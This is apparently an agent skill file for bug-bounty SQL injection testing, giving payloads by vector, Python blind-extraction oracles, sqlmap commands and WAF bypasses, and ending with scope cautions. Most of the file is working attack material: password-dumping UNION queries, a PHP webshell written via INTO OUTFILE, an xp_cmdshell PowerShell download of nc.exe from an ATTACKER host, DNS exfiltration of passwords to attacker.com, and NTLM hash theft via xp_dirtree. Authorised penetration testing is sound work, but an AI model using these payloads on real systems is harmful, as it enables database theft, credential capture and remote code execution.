---
name: sqli
description: SQL Injection (error-based, union, blind boolean, blind time-based, second-order, stacked, file read/write, OOB). Use when HauntMode flags SQLi as APPLIES/MAYBE, when user input feeds a database query, or when you need end-to-end methodology, payloads, sqlmap commands, and WAF bypass techniques.
---

# SQL Injection (INDEX #06)

Read this top-to-bottom on first invocation. Subsequent runs can jump to the relevant section. For sqlmap commands, cross-reference `sqlmap-commands.md` in this folder.

---

## 1. Triggers — when this skill applies

- Any parameter passed to a backend query: GET/POST params, JSON body fields, URL path segments
- Cookies passed to queries (e.g. `TrackingId`, `session_id`, custom analytics cookies)
- HTTP headers that are logged or stored: `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Custom-Header`
- Login forms (username/password), search boxes, sort/order-by parameters, filter parameters
- API endpoints with `id`, `user_id`, `product`, `query`, `search`, `page`, `filter` type fields
- Any numeric or string value used to look up records in a database
- File names or paths that are looked up in a DB before being served
- Second-order: any input that is stored then used in a later query (profile fields, email, display name)

---

---

## 3. 30-second triage

Drop these in every suspect input. Watch for: error messages, response length changes, timing delays, unexpected data in the response.

```
'
''
`
')
"
")
]
))
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2
```

Parse the response differences:
- **Database error message** (MySQL/MSSQL/Postgres/Oracle syntax visible) → likely error-based injectable
- **Response length difference between `AND 1=1` and `AND 1=2`** → boolean-based blind
- **Response time > 5s on `'; WAITFOR DELAY '0:0:5'--`** → time-based blind (MSSQL)
- **Normal response, no error, no difference** → may still be injectable with deeper payloads; escalate to sqlmap with `--level=5 --risk=3`
- **WAF block (403/406/unusual error)** → WAF in play; see §7

---

## 4. Detection — manual payloads by vector type

### 4.1 GET/POST parameters

```
# Basic string break
?id=1'
?id=1"
?id=1`

# Boolean differential
?id=1 AND 1=1--+
?id=1 AND 1=2--+
?id=1' AND '1'='1'--+
?id=1' AND '1'='2'--+

# MSSQL time-based
?id=1'; WAITFOR DELAY '0:0:5'--
?id=1' IF (1=1) WAITFOR DELAY '0:0:5'--

# MySQL time-based
?id=1 AND SLEEP(5)--+
?id=1' AND SLEEP(5)--+

# PostgreSQL time-based
?id=1; SELECT pg_sleep(5)--
```

### 4.2 Cookies

Same payloads as above, injected into the cookie value. Mark the injection point with `*` for sqlmap:
```
Cookie: TrackingId=abc' WAITFOR DELAY '0:0:5'--
Cookie: session=abc*
```

### 4.3 HTTP Headers (User-Agent, Referer, X-Forwarded-For)

Headers are often logged and queried. Inject directly into header value:
```
User-Agent: ' OR '1'='1
User-Agent: '; IF (1=1) WAITFOR DELAY '0:0:5'--
X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--
```

Mark injection point for sqlmap: `User-Agent: Mozilla/5.0*`

### 4.4 JSON body

```json
{"id": "1'"}
{"id": "1 AND 1=1--"}
{"id": "1 AND SLEEP(5)--"}
{"id": {"$ne": 1}}
```

sqlmap handles JSON with `-r req.txt` and `--data`.

### 4.5 Path segments

```
/api/users/1'
/api/users/1%27
/api/items/1 AND SLEEP(5)--
```

Mark with `*`: `/api/users/1*`

---

## 5. Confirmation — proving injection

After detecting a differential or error, confirm the type:

### 5.1 Error-based confirmation (MySQL)

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--+
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--+
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
```

### 5.2 Union-based — column count discovery

```sql
ORDER BY 1--+
ORDER BY 2--+
ORDER BY N--+    -- increment until error; N-1 is the column count

-- Alternative NULL padding
' UNION SELECT NULL--+
' UNION SELECT NULL,NULL--+
' UNION SELECT NULL,NULL,NULL--+   -- until no error = correct column count
```

Once column count known, find a printable column:
```sql
' UNION SELECT NULL,NULL,'a'--+    -- swap NULLs with 'a' until it appears in response
```

### 5.3 Union-based data extraction (MySQL example)

```sql
' UNION SELECT NULL,version(),database()--+
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--+
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--+
' UNION SELECT NULL,username,password FROM users--+
```

### 5.4 Boolean-based blind confirmation

True condition returns normal/longer response; false condition returns empty/different:
```sql
' AND SUBSTRING(version(),1,1)='5'--+    -- MySQL 5.x
' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64--+
' AND (SELECT COUNT(*) FROM users) > 0--+
```

### 5.5 Time-based confirmation

MySQL:
```sql
' AND SLEEP(5)--+
' AND IF(1=1,SLEEP(5),0)--+
' AND IF(ASCII(SUBSTRING(version(),1,1))>50,SLEEP(5),0)--+
```

MSSQL:
```sql
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>50) WAITFOR DELAY '0:0:5'--
```

PostgreSQL:
```sql
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 6. Exploitation

### 6.1 DB enumeration (post-confirmation manual)

```sql
-- MySQL
SELECT version(); SELECT database(); SELECT user();
SELECT schema_name FROM information_schema.schemata;
SELECT table_name FROM information_schema.tables WHERE table_schema='target_db';
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- MSSQL
SELECT @@version; SELECT DB_NAME(); SELECT SYSTEM_USER;
SELECT name FROM master.dbo.sysdatabases;
SELECT table_name FROM information_schema.tables WHERE table_catalog=DB_NAME();

-- PostgreSQL
SELECT version(); SELECT current_database(); SELECT current_user;
SELECT datname FROM pg_database;
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

### 6.2 Blind data extraction — Python oracle pattern (boolean)

```python
# Boolean-based oracle (adapt URL/param/true-condition to the target)
import requests
from urllib.parse import quote_plus

def oracle(q):
    r = requests.get(f"http://target/api?param={quote_plus(f\"' AND ({q})-- -\")}")
    return len(r.text) > 200  # or check for a specific string in response

# Dump string character by character (bisection)
def dump_string(sql_expr, max_len=64):
    length = 0
    for l in range(1, 200):
        if oracle(f"LEN(({sql_expr}))={l}"):
            length = l; break
    result = ""
    for i in range(1, length + 1):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            if oracle(f"ASCII(SUBSTRING(({sql_expr}),{i},1)) BETWEEN {lo} AND {mid}"):
                hi = mid - 1
            else:
                lo = mid + 1
        result += chr(lo)
    return result
```

### 6.3 Blind data extraction — Python oracle pattern (time-based, MSSQL)

```python
import requests, time, statistics

DELAY = 2
URL = "http://target/"

class TimeOracle:
    def calibrate(self):
        times = [self._req({"User-Agent": "baseline"}) for _ in range(6)]
        self.threshold = statistics.mean(times) + 0.35 + DELAY * 0.5

    def _req(self, headers):
        t0 = time.perf_counter()
        requests.get(URL, headers=headers, timeout=15)
        return time.perf_counter() - t0

    def eval(self, predicate):
        h = {"User-Agent": f"';IF(({predicate})) WAITFOR DELAY '0:0:{DELAY}'--"}
        return self._req(h) >= self.threshold
```

### 6.4 Stacked queries (MSSQL / PostgreSQL)

MSSQL stacked queries allow DDL/DML:
```sql
'; INSERT INTO users (username,password) VALUES ('attacker','pwned')--
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options','1'; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell','1'; RECONFIGURE--
```

### 6.5 Second-order SQLi

Input is stored then later used in a query without sanitization. Classic vector: profile fields (username, display name, email) that are later used in `UPDATE` or `SELECT` queries. Test by storing `admin'--` in a profile name and then triggering whatever query uses that field. Confirm via behavior change or error. sqlmap supports second-order with `--second-url` or custom tamper scripts.

### 6.6 File read / write (MySQL only — requires FILE privilege or DBA)

Check privilege:
```sql
' AND (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL--+
```

Read file:
```sql
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--+
```

Write webshell:
```sql
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--+
```

sqlmap equivalents (in sqlmap-commands.md §6):
```
sqlmap -u "..." --file-read "/etc/passwd"
sqlmap -u "..." --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

### 6.7 MSSQL file read via OPENROWSET (requires ADMINISTER BULK OPERATIONS)

```sql
-- Check permission
SELECT COUNT(*) FROM fn_my_permissions(NULL,'DATABASE') WHERE permission_name='ADMINISTER BULK OPERATIONS'

-- Read file
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\flag.txt', SINGLE_CLOB) AS x
```

### 6.8 OOB via DNS (MSSQL — no Collaborator; use time-based preferred)

Note: We have no Burp Collaborator. If OOB is needed and the program allows it, use `YOUR_EZXSS_DOMAIN` or set up a DNS zone. Prefer time-based blind for most cases.

MSSQL OOB patterns (requires `xp_dirtree` / `xp_fileexist` permission):
```sql
-- Exfil data via DNS subdomain
DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63);
SELECT @T=CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),(SELECT TOP 1 password FROM users)),1);
SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63);
EXEC('master..xp_dirtree "\\'+@A+'.'+@B+'.attacker.com\\x"')
```

### 6.9 MSSQL RCE via xp_cmdshell

```sql
-- Enable (requires sa / sysadmin)
'; EXEC sp_configure 'show advanced options','1'; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell','1'; RECONFIGURE--

-- Execute command
'; EXEC xp_cmdshell 'whoami'--

-- Reverse shell (PowerShell base64 encoded)
'; EXEC xp_cmdshell 'powershell -exec bypass -enc <BASE64_PAYLOAD>'--
```

Generate PowerShell base64 payload:
```bash
python3 -c 'import base64; payload = "(new-object net.webclient).downloadfile(\"http://ATTACKER/nc.exe\", \"c:\\windows\\tasks\\nc.exe\")"; print(base64.b64encode(payload.encode("utf-16-le")).decode())'
```

### 6.10 MSSQL — steal NetNTLM hash via xp_dirtree

```sql
'; EXEC master..xp_dirtree '\\ATTACKER_IP\myshare', 1, 1--
```

Run `sudo responder -I tun0` before firing this.

---

## 7. Bypass techniques

### 7.1 Comment variations

```sql
--+       (MySQL URL-safe)
-- -      (space after dash)
#         (MySQL, URL-encode as %23)
/**/      (inline comment, space substitute)
/*!*/     (MySQL versioned comment)
```

### 7.2 Case randomization

```sql
SeLeCt * FrOm UsErS
UNION/**/SELECT
```

### 7.3 Encoding

```
URL: %27 = ', %20 = space, %23 = #
Double URL: %2527 = '
Unicode: %u0027 = '
HTML entity: &#39; = '
```

### 7.4 Whitespace substitution

```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users    (tab)
SELECT%0ausername%0aFROM%0ausers    (newline)
```

### 7.5 HTTP Parameter Pollution (HPP)

```
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
```

### 7.6 Chunked transfer encoding

Use sqlmap `--chunked` flag to split payload across chunks.

### 7.7 Tamper scripts (from notes)

| Script | Effect |
|---|---|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #`, `=` with `BETWEEN # AND #` |
| `randomcase` | Random case on each keyword |
| `space2comment` | Replaces spaces with `/**/` |
| `space2hash` | Replaces spaces with `#` + random + newline (MySQL) |
| `0eunion` | Replaces `UNION` with `e0UNION` |
| `versionedkeywords` | Wraps keywords in MySQL versioned comments |
| `base64encode` | Base64-encodes entire payload |
| `percentage` | Adds `%` before each char (`SELECT` → `%S%E%L%E%C%T`) |
| `modsecurityversioned` | Wraps query in MySQL versioned comment |

Chain tampers: `--tamper=0eunion,between,randomcase`

### 7.8 Anti-CSRF token bypass

```bash
sqlmap -u "..." --data="id=1&csrf-token=VALUE" --csrf-token="csrf-token"
```

### 7.9 Randomize unique parameter

```bash
sqlmap -u "...?id=1&uid=12345" --randomize=uid
```

### 7.10 Calculated parameter bypass (e.g. MD5-of-id)

```bash
sqlmap -u "...?id=1&h=HASH" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

---

## 8. False-positive checks

- **Polyglot confusion**: a `'` causing a parse error in JSON is not SQLi; check that the error is from the database, not the application layer
- **Numeric parameter**: `?id=1 AND 1=1` returning true and `?id=1 AND 1=2` also returning the same result → input is cast to int, not injectable as string
- **Reflected error without control**: an error message containing your input but the query is not actually controlled by it (e.g. error from a separate validation layer)
- **Time-based jitter**: a slow response that is not consistently slow — retest at least 3 times; use majority-vote logic in oracle scripts
- **WAF fake response**: WAF returns a crafted 200 response that mimics the real app; look for cues like missing normal page elements, "Security Event" tokens in body
- **htmlspecialchars / parameterized queries**: if `'` is returned as `&#39;` or `&apos;` in the response, the output is encoded, but the query itself may still be parameterized; confirm by testing the actual query behavior, not just the output encoding

---

## 9. Chain candidates

| Chain | Other skill | Impact |
|---|---|---|
| SQLi → credentials → login | `auth-bypass` | Account takeover |
| SQLi → LOAD_FILE / OPENROWSET → source code | `ssti`, `cmdi` | RCE chain |
| SQLi → INTO OUTFILE / xp_cmdshell → webshell | `cmdi` | Direct RCE |
| SQLi → xp_dirtree → Responder | `auth-bypass` (NTLM relay) | Hash capture |
| SQLi in API returning JSON → stored XSS when rendered | `xss` | Stored XSS via API |
| Second-order SQLi in profile → admin query | `idor` | Admin data exposure |
| Blind SQLi in cookie → session data extraction | `session-security` | Session hijack |

---

## 10. Reporting template

```
POTENTIAL FINDING: SQL Injection — <Error-based | Union-based | Boolean-blind | Time-blind | Second-order | Stacked>
Target: <full URL>
Parameter: <name + location: query/body/cookie/header>
DBMS: <MySQL | MSSQL | PostgreSQL | Oracle | SQLite>
Evidence:
    <error message excerpt | response length differential | timing differential (Xms vs Yms)>
Working payload:
    <exact payload>
Confirmed data extracted (minimal PoC only):
    <e.g. version() = 8.0.32-MySQL Community Server>
Impact:
    <e.g. Full database read access, credential extraction, potential RCE via xp_cmdshell>
Rate limit note: <re-read program-guidelines.txt before running sqlmap>
Next step: <run sqlmap to enumerate / escalate to file read / attempt xp_cmdshell>
```

---

## 11. Recon tracker vector strings

Only log if user explicitly instructs. Suggested tags:

- `sqli:error:<param>` — confirmed error-based
- `sqli:union:<param>` — confirmed union-based
- `sqli:blind-boolean:<param>` — confirmed boolean blind
- `sqli:blind-time:<param>` — confirmed time-based blind
- `sqli:second-order:<field>` — second-order in stored field
- `sqli:stacked:<param>` — stacked queries confirmed
- `sqli:file-read` — LOAD_FILE / OPENROWSET confirmed
- `sqli:rce:xp_cmdshell` — RCE via xp_cmdshell
- `sqli:no:<param>` — confirmed not injectable (parameterized / encoded)

---

## 12. What NOT to do

- **Do not run sqlmap without checking `program-guidelines.txt` rate limits.** sqlmap's default thread count and request rate can easily trigger bans or exhaust API limits. Use `--delay=1 --threads=1` as a starting point on sensitive targets.
- **Do not use `--dump-all` on production databases.** Extract the minimum data needed to prove the vulnerability (e.g. `version()`, one row of a non-PII table, or the first few bytes of a credential hash).
- **Do not attempt `--os-shell` or `xp_cmdshell` without explicit written program approval.** RCE on production is almost always out of scope for automated execution.
- **Do not exfiltrate real PII** (real names, emails, SSNs, credit card numbers) beyond what is strictly necessary to prove the finding. One row proving access is enough.
- **Do not run stacked queries that modify data** (`INSERT`, `UPDATE`, `DELETE`, `DROP`) unless you're on an isolated test environment.
- **Do not report "SQL error visible" as a critical SQLi** without demonstrating data extraction. A generic database error message (e.g. from a timeout) is not the same as an injectable parameter.
- **Do not auto-log to the recon tracker** without explicit user instruction.
- **Do not skip reading `program-guidelines.txt`** before any sqlmap run — always.
